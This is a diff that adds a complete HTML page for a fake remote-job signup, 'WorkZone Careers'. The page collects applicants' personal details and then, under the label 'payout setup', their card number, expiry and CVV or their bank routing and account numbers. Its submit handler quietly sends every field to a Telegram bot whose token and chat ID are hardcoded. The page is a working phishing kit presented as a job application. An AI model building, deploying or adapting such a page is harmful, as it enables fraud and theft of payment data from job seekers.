@@ -1,0 +1,201 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WorkZone | Join Now</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>💼</text></svg>" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(145deg, #eef1f5, #ffffff);
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: #007bff;
+      color: white;
+      text-align: center;
+      padding: 2rem 1rem;
+    }
+    header h1 {
+      font-size: 2rem;
+      margin: 0;
+    }
+    header p {
+      font-size: 1rem;
+      margin: 10px 0 20px;
+    }
+    .join-btn {
+      background: #fff;
+      color: #007bff;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      font-size: 1.1rem;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .container {
+      max-width: 500px;
+      margin: 2rem auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      display: none;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 1rem;
+      color: #2d3a4e;
+    }
+    label {
+      display: block;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background: #fafafa;
+    }
+    .btn {
+      margin-top: 1.5rem;
+      padding: 12px;
+      width: 100%;
+      font-size: 1rem;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .step { display: none; }
+    .step.active { display: block; }
+    .toggle {
+      display: flex;
+      margin-top: 1rem;
+      background: #e9ecef;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .toggle div {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .toggle .active {
+      background: #007bff;
+      color: white;
+    }
+    .thankyou {
+      text-align: center;
+      font-size: 1.4rem;
+      padding: 2rem 1rem;
+      color: #2d3a4e;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>💼 WorkZone Careers</h1>
+    <p>Secure Remote Openings — No Experience Needed</p>
+    <button class="join-btn" onclick="document.querySelector('.container').style.display='block'; this.style.display='none';">JOIN NOW</button>
+  </header>
+
+  <div class="container">
+    <form id="jobForm">
+      <!-- Step 1: Personal Info -->
+      <div class="step active" id="step-1">
+        <h2>Step 1: Your Information</h2>
+        <label>Full Name *</label><input name="name" required>
+        <label>Email *</label><input type="email" name="email" required>
+        <label>Phone *</label><input name="phone" required>
+        <label>Education Level *</label>
+        <select name="education"><option>High School</option><option>Associate</option><option>Bachelor</option><option>Graduate</option></select>
+        <label>Industry *</label>
+        <select name="industry"><option>Technology</option><option>Retail</option><option>Healthcare</option><option>Education</option></select>
+        <button class="btn" type="button" onclick="nextStep(2)">Next</button>
+      </div>
+
+      <!-- Step 2: Payment Info -->
+      <div class="step" id="step-2">
+        <h2>Step 2: Payout Setup</h2>
+        <div class="toggle">
+          <div id="toggle-card" class="active" onclick="togglePayout('card')">💳 Card</div>
+          <div id="toggle-bank" onclick="togglePayout('bank')">🏦 Bank</div>
+        </div>
+
+        <div id="card-form">
+          <label>Card Name *</label><input name="cardName">
+          <label>Card Number *</label><input name="cardNumber">
+          <label>Expiry (MM/YY) *</label><input name="expiry">
+          <label>CVV *</label><input name="cvv">
+        </div>
+        <div id="bank-form" style="display:none;">
+          <label>Bank Name *</label><input name="bankName">
+          <label>Routing Number *</label><input name="routingNumber">
+          <label>Account Number *</label><input name="accountNumber">
+          <label>Account Type *</label>
+          <select name="accountType"><option>Checking</option><option>Savings</option></select>
+        </div>
+        <button class="btn" type="button" onclick="nextStep(3)">Next</button>
+      </div>
+
+      <!-- Step 3: Confirm -->
+      <div class="step" id="step-3">
+        <h2>Step 3: Verify & Submit</h2>
+        <p>Please confirm your details and submit. You will receive an onboarding email after verification.</p>
+        <button class="btn" type="submit">Submit & Verify</button>
+      </div>
+
+      <!-- Final Thank You Message -->
+      <div class="step" id="step-thanks">
+        <div class="thankyou">
+          ✅ Thank you!<br>Your onboarding details are pending verification.<br>You’ll be emailed shortly.
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const steps = document.querySelectorAll('.step');
+    function nextStep(n) {
+      steps.forEach(s => s.classList.remove('active'));
+      document.getElementById('step-' + n).classList.add('active');
+    }
+
+    function togglePayout(type) {
+      document.getElementById('card-form').style.display = (type === 'card') ? 'block' : 'none';
+      document.getElementById('bank-form').style.display = (type === 'bank') ? 'block' : 'none';
+      document.getElementById('toggle-card').classList.toggle('active', type === 'card');
+      document.getElementById('toggle-bank').classList.toggle('active', type === 'bank');
+    }
+
+    document.getElementById('jobForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = Object.fromEntries(new FormData(this));
+      const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
+      const CHAT_ID = '1318100118';
+      let msg = '*📝 New Applicant*\n';
+      for (let k in data) msg += `*${k}*: ${data[k]}\n`;
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+      });
+      nextStep('thanks');
+    });
+  </script>
+</body>
+</html>
